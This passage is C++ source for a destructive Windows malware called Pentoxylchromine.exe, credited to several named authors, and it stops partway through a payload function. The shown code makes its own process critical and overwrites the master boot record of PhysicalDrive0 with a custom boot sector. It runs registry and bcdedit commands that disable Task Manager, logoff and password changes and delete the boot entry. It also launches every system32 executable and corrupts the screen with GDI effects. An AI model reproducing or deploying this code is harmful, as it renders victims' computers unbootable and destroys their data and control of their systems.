//Pentoxylchromine.exe
// 
//A 24-payload malware by UltraDasher965, TELEPATHII, Number333, Executioner / VenraTech & sixtyfourYT
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <thread>
#include <iostream>
#include <tlhelp32.h>
#include <tchar.h>
#include <cmath>
#include <ctime>
#include <mmsystem.h>
#include <time.h>
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "winmm.lib")
#define pi   3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
HCRYPTPROV hProv;
INT random() {
    if (hProv == NULL)
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
            ExitProcess(1);

    INT nOut;
    CryptGenRandom(hProv, sizeof(nOut), (BYTE*)(&nOut));
    return nOut & 0x7fffffff;
}
typedef ULONG32(NTAPI* lpNtShutdownSystem)(int Action);
typedef ULONG32(NTAPI* lpNtSetSystemPowerState)(IN POWER_ACTION SystemAction, IN SYSTEM_POWER_STATE MinSystemState, IN ULONG32 Flags);

HDC hdc = GetDC(0);
HDC hdcCopy = CreateCompatibleDC(hdc);
int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);

COLORREF COLORHSL(int length);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) //enable Privilege
{
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));

    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }

    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical()
{
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;

    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL)
    {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

DWORD WINAPI RMSGBX(LPVOID lpvd)
{
    LPCWSTR string = L"You have made a huge mistake!";

    while (1)
    {
        int fx = rand() % 10;

        MessageBoxW(NULL, string, L"Pentoxylchromine.exe - You fucked up.", MB_OK | MB_ICONINFORMATION);

        if (fx == 0) string = L"Cry about it!";
        if (fx == 1) string = L"Send this virus to nobody...\n\n...except for someone who's name is WinAero2008";
        if (fx == 2) string = L"PENTOXYLCHROMINE.EXE ATE YOUR PC!!!";
        if (fx == 3) string = L"YOU'RE NOT GETTING YOUR PC BACK";
        if (fx == 4) string = L"'OOH OOH OOH OOH OOH AHH OOH AHH' - __neckguy1";
        if (fx == 5) string = L"The FitnessGram PACER Test is a multistage aerobic capacity test that progressively gets more difficult as it continues. The test is used to measure a student's aerobic capacity as part of the FitnessGram assessment. Students run back and forth as many times as they can, each lap signaled by a beep sound. The test get progressively faster as it continues until the student reaches their max lap score.\n\nThe PACER Test score is combined in the FitnessGram software with scores for muscular strength, endurance, flexibility and body composition to determine whether a student is in the Healthy Fitness Zone™ or the Needs Improvement Zone™.";
        if (fx == 6) string = L"'credits to Executioner, but I modified it' - camellia-y7x";
        if (fx == 7) string = L"'No skidded' - pankoza";
        if (fx == 8) string = L"肺尘埃沉着病";
        if (fx == 9) string = L"Durability, agility, flexibility, stability, velocity and colossity, and collide, and glide!";
        if (fx == 10) string = L"'Someone FORGOT to remove this file.' - sixtyfourYT";
    }
    return 0x00;
}

void ShiftColors(HDC hdc, HBITMAP hBitmap, int width, int height) {
    int bytesPerPixel = 3;
    int stride = ((width * bytesPerPixel + 3) & ~3);
    BYTE* pPixels = new BYTE[stride * height];
    BITMAPINFO bmi = {};
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 24;
    bmi.bmiHeader.biCompression = BI_RGB;
    GetDIBits(hdc, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);
    for (int y = 0; y < height; y++) {
        BYTE* row = pPixels + y * stride;
        for (int x = 0; x < width; x++) {
            BYTE* px = row + x * 3;
            BYTE r = px[2];
            BYTE g = px[1];
            BYTE b = px[0];
            px[2] = g; px[1] = b; px[0] = r;
        }
    }
    SetDIBits(hdc, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);
    delete[] pPixels;
}

void ApplyDistortion(HDC hdcScreen, int width, int height, float time) {
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    for (int y = 0; y < height; y++) {
        int offsetX = (int)(1 * ((y + time) * 0.05f));
        BitBlt(hdcScreen, 0, y, width, 1, hdcMem, offsetX, y, SRCCOPY);
    }

    DeleteObject(hBmp);
    DeleteDC(hdcMem);
}

void ApplyDistortion2(HDC hdcScreen, int width, int height, float time) {
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    for (int y = 0; y < height; y++) {
        int offsetX = (int)(20 * sin((y + time) * 0.05f));
        BitBlt(hdcScreen, 0, y, width, 1, hdcMem, offsetX, y, SRCCOPY);
    }

    DeleteObject(hBmp);
    DeleteDC(hdcMem);
}

void ApplyDistortion3(HDC hdcScreen, int width, int height, float time) {
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hdcScreen, width, height);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    for (int y = 0; y < height; y++) {
        int offsetX = (int)(20 * tan((y + time) * 0.05f));
        BitBlt(hdcScreen, 0, y, width, 1, hdcMem, offsetX, y, SRCCOPY);
    }

    DeleteObject(hBmp);
    DeleteDC(hdcMem);
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
{
    const WCHAR* labelText = L"PENTOXYLCHROMINE.EXE";

    if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
    {
        SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
    }

    return true;
}

DWORD WINAPI PentoxylchromineLabel(LPVOID lpvd)
{
    while (true)
    {
        HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
        EnumChildWindows(hwnd, EnumChildProc, NULL);
    }
}

const unsigned char MBRTEXT[]{
    0xB4, 0x07, 0xB0, 0x00, 0xB6, 0x18, 0xB2, 0x50, 0xCD, 0x10, 0xB4, 0x01, 0xB9, 0x07, 0x26, 0xCD,
0x10, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0xBE, 0x3A, 0x7C, 0xB1, 0x28, 0xB4, 0x0E, 0x8A, 0x04,
0xB7, 0x00, 0x88, 0xCB, 0xCD, 0x10, 0xAC, 0xF4, 0xFE, 0xC1, 0x80, 0xF9, 0x37, 0x74, 0x07, 0x3C,
0x00, 0x75, 0xE9, 0xF4, 0xEB, 0xFD, 0xB1, 0x20, 0xEB, 0xE2, 0x57, 0x65, 0x6C, 0x63, 0x6F, 0x6D,
0x65, 0x20, 0x74, 0x6F, 0x20, 0x50, 0x65, 0x6E, 0x74, 0x6F, 0x78, 0x79, 0x6C, 0x63, 0x68, 0x72,
0x6F, 0x6D, 0x69, 0x6E, 0x65, 0x27, 0x73, 0x20, 0x4D, 0x42, 0x52, 0x21, 0x0A, 0x0D, 0x0A, 0x0D,
0x50, 0x65, 0x6E, 0x74, 0x6F, 0x78, 0x79, 0x6C, 0x63, 0x68, 0x72, 0x6F, 0x6D, 0x69, 0x6E, 0x65,
0x20, 0x69, 0x73, 0x20, 0x61, 0x20, 0x6D, 0x61, 0x6C, 0x77, 0x61, 0x72, 0x65, 0x20, 0x62, 0x79,
0x20, 0x55, 0x6C, 0x74, 0x72, 0x61, 0x44, 0x61, 0x73, 0x68, 0x65, 0x72, 0x39, 0x36, 0x35, 0x2C,
0x20, 0x4E, 0x75, 0x6D, 0x62, 0x65, 0x72, 0x33, 0x33, 0x33, 0x2C, 0x20, 0x54, 0x45, 0x4C, 0x45,
0x50, 0x41, 0x54, 0x48, 0x49, 0x49, 0x2C, 0x20, 0x56, 0x65, 0x6E, 0x72, 0x61, 0x54, 0x65, 0x63,
0x68, 0x2F, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x69, 0x6F, 0x6E, 0x65, 0x72, 0x20, 0x61, 0x6E,
0x64, 0x20, 0x73, 0x69, 0x78, 0x74, 0x79, 0x66, 0x6F, 0x75, 0x72, 0x36, 0x34, 0x2E, 0x0A, 0x0D,
0x0A, 0x0D, 0x49, 0x74, 0x20, 0x69, 0x73, 0x20, 0x62, 0x79, 0x20, 0x66, 0x61, 0x72, 0x20, 0x44,
0x61, 0x73, 0x68, 0x79, 0x27, 0x73, 0x20, 0x62, 0x65, 0x73, 0x74, 0x20, 0x6F, 0x6E, 0x65, 0x20,
0x79, 0x65, 0x74, 0x2E, 0x0A, 0x0D, 0x0A, 0x0D, 0x45, 0x76, 0x65, 0x6E, 0x20, 0x62, 0x65, 0x74,
0x74, 0x65, 0x72, 0x20, 0x74, 0x68, 0x61, 0x6E, 0x20, 0x56, 0x59, 0x49, 0x75, 0x67, 0x55, 0x47,
0x49, 0x37, 0x41, 0x2C, 0x20, 0x54, 0x65, 0x74, 0x72, 0x61, 0x62, 0x65, 0x6E, 0x7A, 0x79, 0x6C,
0x64, 0x69, 0x6F, 0x78, 0x61, 0x6E, 0x65, 0x2C, 0x20, 0x65, 0x74, 0x63, 0x2E, 0x0A, 0x0D, 0x0A,
0x0D, 0x54, 0x68, 0x65, 0x20, 0x46, 0x41, 0x4B, 0x45, 0x20, 0x4D, 0x42, 0x52, 0x20, 0x70, 0x61,
0x79, 0x6C, 0x6F, 0x61, 0x64, 0x73, 0x20, 0x77, 0x65, 0x72, 0x65, 0x20, 0x63, 0x72, 0x65, 0x61,
0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x56, 0x65, 0x6E, 0x72, 0x61, 0x20, 0x61, 0x6E, 0x64,
0x20, 0x55, 0x6C, 0x74, 0x72, 0x61, 0x44, 0x61, 0x73, 0x68, 0x65, 0x72, 0x39, 0x36, 0x35, 0x2C,
0x20, 0x4E, 0x6F, 0x77, 0x20, 0x74, 0x68, 0x61, 0x74, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x68, 0x61,
0x76, 0x65, 0x20, 0x72, 0x61, 0x6E, 0x20, 0x74, 0x68, 0x69, 0x73, 0x20, 0x6D, 0x61, 0x6C, 0x77,
0x61, 0x72, 0x65, 0x2E, 0x20, 0x59, 0x6F, 0x75, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20,
0x65, 0x73, 0x63, 0x61, 0x70, 0x65, 0x20, 0x74, 0x68, 0x65, 0x20, 0x70, 0x6F, 0x77, 0x65, 0x72,
0x20, 0x6F, 0x66, 0x20, 0x50, 0x65, 0x6E, 0x74, 0x6F, 0x78, 0x79, 0x6C, 0x63, 0x68, 0x72, 0x6F,
0x6D, 0x69, 0x6E, 0x65, 0x21, 0x0A, 0x0D, 0x0A, 0x0D, 0x4E, 0x4F, 0x20, 0x45, 0x53, 0x43, 0x41,
0x50, 0x45, 0x20, 0x46, 0x52, 0x4F, 0x4D, 0x20, 0x50, 0x45, 0x4E, 0x54, 0x4F, 0x58, 0x59, 0x4C,
0x43, 0x48, 0x52, 0x4F, 0x4D, 0x49, 0x4E, 0x45, 0x21, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };

DWORD WINAPI MBROverwriter(LPVOID lpParam) {
    DWORD dwWrittenBytes;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);

    CHAR pcNullData[512];
    RtlZeroMemory(pcNullData, 512);

    WriteFile(hDevice, MBRTEXT, 512, &dwWrittenBytes, NULL);
    return 1;
}

DWORD WINAPI disabler(LPVOID lpParam) {
    system("taskkill /f /im taskmgr.exe");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
    system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoControlPanel /t reg_dword /d 1 /f");
    system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
    system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
    system("bcdedit /delete {current}");
    return 1;
}

DWORD WINAPI taskbarpoof(LPVOID lpvd) {
    static HWND hShellWnd = ::FindWindow(_T("Shell_TrayWnd"), NULL);
    ShowWindow(hShellWnd, SW_HIDE);
    return 0;
}

DWORD WINAPI opener(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(3000);
        }
    }
}

DWORD WINAPI shaking(LPVOID lpParam) {
    int r = 10;
    while (true) {
        RECT rect;
        HWND hwnd = GetForegroundWindow();
        GetWindowRect(hwnd, &rect);
        int po = rand() % 4 + 1;
        if (po == 4) SetWindowPos(hwnd, 0, rect.left + r, rect.top, 100, 100, SWP_NOSIZE);
        if (po == 3) SetWindowPos(hwnd, 0, rect.left - r, rect.top, 100, 100, SWP_NOSIZE);
        if (po == 2) SetWindowPos(hwnd, 0, rect.left, rect.top + r, 100, 100, SWP_NOSIZE);
        if (po == 1) SetWindowPos(hwnd, 0, rect.left, rect.top - r, 100, 100, SWP_NOSIZE);
    }
}

//GDI Effects
DWORD WINAPI Number333_Payload1(LPVOID lpParam) {
    float time = 0.0f;

    while (true) {
        HDC hdcScreen = GetDC(NULL);
        ApplyDistortion(hdcScreen, w, h, time);
        BitBlt(hdcScreen, 20, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        time += 0.1f;
        ReleaseDC(NULL, hdcScreen);
    }
}

DWORD WINAPI TELEPATHII_Payload1(LPVOID lpParam) {

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;

    while (1) {
        hdc = GetDC(NULL);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdcCopy, -1, -1, w, h, hdc, 2, 2, SRCPAINT);
        BitBlt(hdcCopy, rand() % 1, rand() % 1, w, h, hdc, rand() % 1, rand() % 1, PATINVERT);
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
        DeleteObject(brush);
    }
}

DWORD WINAPI TELEPATHII_Payload2(LPVOID lpParam) {
    HDC hdc;
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    while (1) {
        int size = rand() % 300;
        hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
        HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
        SelectObject(hdcMem, screenshot);
        BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < 30; i++) {
            int x = -size + rand() % (sw + size), y = -size + rand() % (sh + size);
            HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
            SelectObject(hdc, brush);
            BitBlt(hdcMem, x, y, size, size, hdcMem, x + rand() % 17 - 8, y + rand() % 17 - 8, SRCCOPY);
            BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdcMem, rand() % 10, rand() % 10, SRCINVERT);
            StretchBlt(hdc, -10, -10, w + 20, h + 20, hdcMem, 0, 0, w, h, SRCCOPY);
            BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, PATINVERT);
            DeleteObject(brush);
        }
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
        AlphaBlend(hdc, 0, 0, sw, sh, hdcCopy, 0, 0, sw, sh, blend);
        ReleaseDC(0, hdc);
        DeleteObject(screenshot); DeleteDC(hdcMem); DeleteDC(hdc);
    }
}

DWORD WINAPI UltraDasher965_Payload1(LPVOID lpParam) {
    while (1) {
        hdc = GetDC(0);
        BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, SRCPAINT);
        BitBlt(hdc, 1, 1, w, h, hdc, 0, 0, SRCERASE);
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI VenraTech_Payload1(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (int t = 0; ; t *= 10) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (int i = 0; i < w; i++) {
            for (int j = 0; j < h; j++) {
                INT x = i % w, y = i / w;
                rgbScreen[i * j].rgb += (x ^ y | x & y);
            }
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

DWORD WINAPI sixtyfourYT_Payload1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    INT w = GetSystemMetrics(SM_CXSCREEN);
    INT h = GetSystemMetrics(SM_CYSCREEN);

    for (;;)
    {
        for (INT i = 0; i < 5; i++)
        {
            HDC hdc = GetDC(NULL);
            INT randW = rand() % w;
            INT randH = rand() % h;

            BitBlt(hdc, randW, rand() % 20 - 10, 100, h, hdc, randW, 0, SRCAND);
            BitBlt(hdc, rand() % 20 - 10, randH, w, 100, hdc, 0, randH, SRCPAINT);
        }
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI Number333_Payload2(LPVOID lpParam) {
    srand(time(NULL));
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0), h = GetSystemMetrics(1), rndsize = 1 + rand() % (h / 2);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL; HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
        for (int x = 0; x < w; x++) {
            StretchBlt(hcdc, x, -2 + rand() % 2, 1, h, hcdc, x, 0, 1, h, SRCINVERT);
        }
        for (int x = 0; x < w; x += rndsize) {
            StretchBlt(hcdc, x, -2 + rand() % 2, rndsize, h, hcdc, x, 0, rndsize, h, SRCCOPY);
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -2 + rand() % 2, y, w, 1, hcdc, 0, y, w, 1, SRCINVERT);
        }
        for (int y = 0; y < h; y += rndsize) {
            StretchBlt(hcdc, -2 + rand() % 2, y, w, rndsize, hcdc, 0, y, w, rndsize, SRCCOPY);
        }
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                float fx = (4 * i) + ((4 * i) * abs(logbf(sin(x / pi * 14)))) + (4 * i) + ((4 * i) * logbf(tan((y + i)) / 320));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 1000.f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l += 0.1f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCPAINT);
        StretchBlt(hdc, 1, 1, w, h, hcdc, 0.5, 0.5, w, h, SRCINVERT);
        BLENDFUNCTION blend = { 0, 0, 20, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blend);
        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
        Sleep(1);
        i += 4;
    }
}

DWORD WINAPI UltraDasher965_Payload2(LPVOID lpParam) {
    HDC hdc = GetDC(0);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);

    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;

    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);

    RECT rect;
    POINT lpt[3];

    while (1)
    {
        hdc = GetDC(0);
        INT counter = rand() % 3 + (rand() % -3);
        GetWindowRect(GetDesktopWindow(), &rect);

        if (rand() % 2 == 0)
        {
            lpt[0].x = rect.left + counter;
            lpt[0].y = rect.top - counter;
            lpt[1].x = rect.right + counter;
            lpt[1].y = rect.top - counter;
            lpt[2].x = rect.left - counter;
            lpt[2].y = rect.bottom - counter;
            PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        }

        else if (rand() % 2 == 1)
        {
            lpt[0].x = rect.left - counter;
            lpt[0].y = rect.top + counter;
            lpt[1].x = rect.right - counter;
            lpt[1].y = rect.top - counter;
            lpt[2].x = rect.left - counter;
            lpt[2].y = rect.bottom + counter;
            PlgBlt(hdc, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        }

        PlgBlt(hdcCopy, lpt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
        BLENDFUNCTION blend = { 0, 0, 100, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI UltraDasher965_Payload3(LPVOID lpParam) {

    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

